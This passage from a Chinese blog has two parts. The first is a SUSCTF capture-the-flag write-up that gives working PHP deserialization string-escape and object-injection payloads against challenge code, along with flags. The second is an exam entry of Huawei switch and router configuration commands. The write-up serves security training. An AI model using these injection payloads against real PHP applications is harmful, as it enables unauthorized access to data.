<p>又比如英语中比较常见的THE,IS等,根据已知的emoji和语句意进行猜测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">😋🥺😍</span><br><span class="line">THE</span><br><span class="line">😳🤪</span><br><span class="line">IS</span><br><span class="line">😆😠🤣🧐☯</span><br><span class="line">FLAG:</span><br><span class="line">😋🥺😍🤐</span><br><span class="line">THEY</span><br><span class="line">😋🤐😖😍</span><br><span class="line">TYPE</span><br><span class="line">更新后的flag</span><br><span class="line">SUSCTF&#123;EASY_REPLACE_CRYPTE&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h3><p>抓包改post传参</p>
<figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUSCTF{397d79b4fd5bb85d73d86742dfdf223d}</p>
<h3 id="AT-Field"><a href="#AT-Field" class="headerlink" title="AT_Field"></a>AT_Field</h3><p>修改可以输入的字符长度,输入flag并提交</p>
<figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUSCTF{0e808712e2a814fe0cd126e09159226a}</p>
<h3 id="Script-Kiddle"><a href="#Script-Kiddle" class="headerlink" title="Script_Kiddle"></a>Script_Kiddle</h3><p>抓个包爆破,需要缘分</p>
<figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUSCTF{24bf10b0f61c19e10a631e4c603127b2}</p>
<h3 id="first-lesson"><a href="#first-lesson" class="headerlink" title="first_lesson"></a>first_lesson</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"z33"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;z33 is "</span> . $_GET[<span class="string">'z33'</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"z33"</span>] === <span class="string">"feiwu"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"rmb"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;rmb is "</span> . $_GET[<span class="string">"rmb"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"rmb"</span>] === <span class="string">"shenxian"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"aa"</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;aa is dage of "</span> . $_POST[<span class="string">"aa"</span>] . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">"aa"</span>] === <span class="string">"z33&amp;rmb"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use POST method to submit aa&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit rmb&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;use GET method to submit z33&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUSCTF{so_who_is_AA}</p>
<h3 id="刀来！"><a href="#刀来！" class="headerlink" title="刀来！"></a>刀来！</h3><figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>SUSCTF{f5f397a37b728d927576ae889b908d17}</p>
<h3 id="Ez-escape1"><a href="#Ez-escape1" class="headerlink" title="Ez_escape1"></a>Ez_escape1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">$number=<span class="number">10086</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">public</span> $number;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name=$name;</span><br><span class="line"><span class="keyword">$this</span>-&gt;number=$number;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'nzgnb'</span>,<span class="string">'nzgyyds'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$epoch=filter(serialize(<span class="keyword">new</span> escape($name,$number)));</span><br><span class="line"><span class="keyword">echo</span> $epoch.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$ep0ch=unserialize($epoch);</span><br><span class="line"><span class="keyword">if</span>($ep0ch-&gt;number===<span class="number">1008611</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>nzgnb被替换成nzgyyds逃逸2个字符,需要传入的数据长度是26,name传入13个nzgnb即可逃逸<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:4:&quot;name&quot;;s:91:&quot;nzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyydsnzgyyds&quot;;s:6:&quot;number&quot;;i:1008611;&#125;&quot;;s:6:&quot;number&quot;;i:10086;&#125;</span><br><span class="line">U1VTQ1RGe2MyYmQyOWRiNDk1N2JmODBjM2M5OWRlMTliZDRhNjBkfQ==</span><br></pre></td></tr></table></figure></p>
<p>SUSCTF{c2bd29db4957bf80c3c99de19bd4a60d}</p>
<h3 id="Ez-escape2"><a href="#Ez-escape2" class="headerlink" title="Ez_escape2"></a>Ez_escape2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$haidilao=$_POST[<span class="string">"haidilao"</span>];</span><br><span class="line">$core=$_POST[<span class="string">"core"</span>];</span><br><span class="line">$num=<span class="string">"2019"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $haidilao;</span><br><span class="line"><span class="keyword">public</span> $core;</span><br><span class="line"><span class="keyword">public</span> $num;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($haidilao,$core,$num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;haidilao=$haidilao;</span><br><span class="line"><span class="keyword">$this</span>-&gt;core=$core;</span><br><span class="line"><span class="keyword">$this</span>-&gt;num=$num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;num===<span class="string">"2020"</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(file_get_contents(<span class="string">"/flag"</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"try again"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> str_replace(<span class="string">'Haidilao'</span>,<span class="string">'Hedilao'</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$btis=filter(serialize(<span class="keyword">new</span> escape2($haidilao,$core,$num)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$btis.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$bt15=unserialize($btis);</span><br></pre></td></tr></table></figure>
<p>根据过滤后字符串减少的原理,使core传入构造代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"escape2"</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">"haidilao"</span>;s:<span class="number">8</span>:<span class="string">"Hedilao"</span>;s:<span class="number">4</span>:<span class="string">"core"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">4</span>:<span class="string">"2019"</span>;&#125; <span class="comment">#正常的序列化字符串</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span> <span class="comment"># 需要吃掉的字符</span></span><br><span class="line"><span class="string">";s:4:"</span>core<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:3:"</span>num<span class="string">";s:4:"</span><span class="number">2020</span><span class="string">";&#125; # 需要传输的core的值</span></span><br></pre></td></tr></table></figure></p>
<p>截止到core的值共19个字符,即传入19个Haidilao,替换成Hedilao后吞掉19个字符,使后面的payload补上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haidilao=HaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilaoHaidilao</span><br><span class="line">HaidilaoHaidilaoHaidilaoHaidilao&amp;core=&quot;;s:4:&quot;core&quot;;s:3:&quot;123&quot;;s:3:&quot;num&quot;;s:4:&quot;2020&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="AA-is-who"><a href="#AA-is-who" class="headerlink" title="AA_is_who"></a>AA_is_who</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $name;</span><br><span class="line"><span class="keyword">protected</span> $power;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">"Aryb1n"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is Aryb1n"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;power &gt; <span class="number">100000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is powerful"</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"AA is not so weak"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"who is AA?"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// maybe you should consider URL encode?</span></span><br><span class="line">$aa = $_GET[<span class="string">"aa"</span>];</span><br><span class="line">unserialize($aa);</span><br></pre></td></tr></table></figure>
<p>get接受aa变量的传参,要求$power的值大于100000,$name的值为Aryb1n,使代码序列化<br>$power类型为protected,需要使用%00进行填充补全,也可以将序列化串进行url编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=Aryb1n;</span><br><span class="line">    <span class="keyword">protected</span> $power=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> AA();</span><br><span class="line"><span class="keyword">print</span> serialize($a);</span><br><span class="line"><span class="keyword">print</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:2:"AA":2:&#123;s:4:"name";s:6:"Aryb1n";s:8:"*power";i:1000000;&#125;</span></span><br><span class="line"><span class="comment">//O%3A2%3A%22AA%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A6%3A%22Aryb1n%22%3Bs%3A8%3A%22%00%2A%00power%22%3Bi%3A1000000%3B%7D</span></span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>]]></content>
      
        <categories>
            
            <category> ctf writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[大二下网络工程实训考试]]></title>
      <url>/%E6%97%A5%E5%B8%B8/ckwd5wsa0005od0ucj3helofl/</url>
      <content type="html"><![CDATA[<h2 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h2><figure class="image-box">
                <img src="./考试要求.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<h2 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h2><p>vlan 10</p>
<p>192.168.学号后三位.x 24</p>
<p>vlan 20</p>
<p>192.168.学号后三位+2.x 24</p>
<p>vlan 30</p>
<p>192.168.学号后三位+3.x 24</p>
<p>三层设备互联使用30位掩码</p>
<h3 id="SW1"><a href="#SW1" class="headerlink" title="SW1"></a>SW1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8</span><br><span class="line">int g0/0/11</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/4</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">int g0/0/2</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  10 pri   8192</span><br><span class="line">stp instance  20 pri   32768</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="SW2"><a href="#SW2" class="headerlink" title="SW2"></a>SW2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8</span><br><span class="line">int g0/0/4</span><br><span class="line">p l a</span><br><span class="line">p d v 30</span><br><span class="line">int g0/0/13</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int g0/0/1</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/3</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  20 pri   8192</span><br><span class="line">stp instance  10 pri   32768</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="SW3"><a href="#SW3" class="headerlink" title="SW3"></a>SW3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 30 8 13</span><br><span class="line">int g0/0/2</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/3</span><br><span class="line">p l t</span><br><span class="line">p t a v 10 20 30 8</span><br><span class="line">int g0/0/1</span><br><span class="line">p l a</span><br><span class="line">p d v 13</span><br><span class="line">int g0/0/8</span><br><span class="line">p l a</span><br><span class="line">p d v 8</span><br><span class="line">router id 192.168.13.2</span><br><span class="line">ospf</span><br><span class="line">area 0</span><br><span class="line">net 192.168.13.2 0.0.0.0</span><br><span class="line">q</span><br><span class="line">ospf</span><br><span class="line">a 1</span><br><span class="line">net 192.168.8.1 0.0.0.0</span><br><span class="line">q</span><br><span class="line">a 2</span><br><span class="line">net 0.0.0.0 0.0.0.0</span><br><span class="line">q</span><br><span class="line">int vlan  13</span><br><span class="line">ip add 192.168.13.2 30</span><br><span class="line">int vlan 8</span><br><span class="line">ip add 192.168.8.1 30</span><br><span class="line">int v 10</span><br><span class="line">ip add 192.168.136.1 24</span><br><span class="line">int v 20</span><br><span class="line">ip add 192.168.138.1 24</span><br><span class="line">int v 30</span><br><span class="line">ip add 192.168.139.1 24</span><br><span class="line">stp mode mstp</span><br><span class="line">stp region-config </span><br><span class="line">region-name xmd</span><br><span class="line">revision-level 1</span><br><span class="line">instance 10 vlan 10 20</span><br><span class="line">instance 20 vlan  30</span><br><span class="line">active  region-configuration </span><br><span class="line">stp instance  10 pri   4096</span><br><span class="line">stp instance  20 pri   4096</span><br><span class="line">dhcp enable</span><br><span class="line">ip pool v10</span><br><span class="line">net 192.168.136.0 mask 24</span><br><span class="line">gateway-list 192.168.136.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.136.2 192.168.136.10</span><br><span class="line">int vlan 10</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip pool v20</span><br><span class="line">net 192.168.138.0 mask 24</span><br><span class="line">gateway-list 192.168.138.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.138.2 192.168.138.10</span><br><span class="line">int vlan 20</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip pool v30</span><br><span class="line">net 192.168.139.0 mask 24</span><br><span class="line">gateway-list 192.168.139.1</span><br><span class="line">dns-list 202.106.0.20 192.168.8.8</span><br><span class="line">lease day 5</span><br><span class="line">excluded-ip-address 192.168.139.2 192.168.139.10</span><br><span class="line">int vlan 30</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="SW5"><a href="#SW5" class="headerlink" title="SW5"></a>SW5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">v b 10 20 13</span><br><span class="line">int e0/0/1</span><br><span class="line">p l a</span><br><span class="line">p d v 10</span><br><span class="line">int e0/0/2</span><br><span class="line">p l a</span><br><span class="line">p d v 20</span><br><span class="line">int e0/0/3</span><br><span class="line">p l a</span><br><span class="line">p d v 13</span><br><span class="line">int v 10</span><br><span class="line">ip add 192.168.136.1 24</span><br><span class="line">q</span><br><span class="line">int v 20</span><br><span class="line">ip add 192.168.138.1 24</span><br><span class="line">q</span><br><span class="line">int v 13</span><br><span class="line">ip add 192.168.13.2 30</span><br><span class="line">q</span><br><span class="line">dhcp en</span><br><span class="line">ip pool v10</span><br><span class="line">net 192.168.136.0 mask 24</span><br><span class="line">gateway-list 192.168.136.1</span><br><span class="line">dns-list 202.106.0.20 </span><br><span class="line">lease day 5</span><br><span class="line">int vlan 10</span><br><span class="line">dhcp select global</span><br><span class="line">quit</span><br><span class="line">ip route-s 0.0.0.0 0 192.168.13.1</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="AR4"><a href="#AR4" class="headerlink" title="AR4"></a>AR4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sys</span><br><span class="line">sys 2136</span><br><span class="line">int g0/0/1</span><br><span class="line">ip add 192.168.13.1 30</span><br><span class="line">int g0/0/2</span><br><span class="line">ip add 202.106.2.2 29</span><br><span class="line">ip route-s 0.0.0.0 0 202.106.2.1</span><br><span class="line">ip route-s 192.168.0.0 16 192.168.13.2</span><br><span class="line">acl n 2000</span><br><span class="line">rule p s an</span><br><span class="line">int g0/0/2</span><br><span class="line">nat out 2000</span><br><span class="line">int g0/0/2</span><br><span class="line">nat se p tcp gl 202.106.2.3 tel inside 192.168.13.2 23</span><br><span class="line">super password cipher 